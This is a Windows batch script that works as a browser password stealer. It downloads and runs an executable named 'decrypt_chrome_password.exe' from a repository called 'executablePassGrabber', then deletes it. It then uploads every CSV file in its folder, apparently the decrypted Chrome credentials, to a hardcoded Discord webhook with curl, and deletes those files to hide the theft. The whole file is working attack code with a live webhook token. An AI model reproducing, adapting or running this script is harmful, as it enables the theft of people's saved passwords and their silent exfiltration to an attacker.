@echo off
setlocal

:: Define configuration
set "fileUrl=https://github.com/Millard-alt/executablePassGrabber/raw/main/decrypt_chrome_password.exe"
set "downloadedFile=%~dp0decrypt_chrome_password.exe"
set "webhookUrl=https://discord.com/api/webhooks/1265362626750189610/koLGXpaUiHZXzINDZwl1l_Sh3TCsSKRdGmA9uHBVHLCThn-N0sNgmdulFOtR7cMBUOA9"
set "csvDirectory=%~dp0"
set "logFile=%csvDirectory%process_log.txt"
set "errorLogFile=%csvDirectory%error_log.txt"

:: Clear previous log files
> "%logFile%" echo Log file initialized.
> "%errorLogFile%" echo Error log file initialized.

:: Download the file
echo Downloading %fileUrl%...
powershell -Command "Invoke-WebRequest -Uri '%fileUrl%' -OutFile '%downloadedFile%'"
if %ERRORLEVEL% neq 0 (
    echo Failed to download %fileUrl%. >> "%errorLogFile%"
    exit /b
)

:: Execute the downloaded file
echo Executing %downloadedFile%...
start "" "%downloadedFile%"
if %ERRORLEVEL% neq 0 (
    echo Failed to execute %downloadedFile%. >> "%errorLogFile%"
    exit /b
)

:: Wait for the file to execute (3 seconds)
timeout /t 3 /nobreak >nul

:: Hide the downloaded file
attrib +h "%downloadedFile%"

:: Delete the downloaded file
del /f /q "%downloadedFile%"

:: Scan through all CSV files in the directory
set "fileCount=0"
for %%f in ("%csvDirectory%*.csv") do (
    set /a fileCount+=1
    echo Processing %%f...
    
    :: Send the CSV file to the Discord webhook using curl
    curl -X POST %webhookUrl% -F "file=@%%f" >nul 2>> "%errorLogFile%"

    :: Check if the curl command was successful
    if %ERRORLEVEL% neq 0 (
        echo Failed to send %%f to Discord. >> "%errorLogFile%"
    ) else (
        echo Successfully sent %%f to Discord. >> "%logFile%"
        
        :: Hide the CSV file
        attrib +h "%%f"

        :: Delete the CSV file after sending
        del /f /q "%%f"
        echo Deleted and hidden %%f >> "%logFile%"
    )
)

:: Provide summary of operations
if %fileCount%==0 (
    echo No CSV files found in %csvDirectory%. >> "%errorLogFile%"
) else (
    echo Processed %fileCount% CSV files. >> "%logFile%"
)

:: Exit the script
exit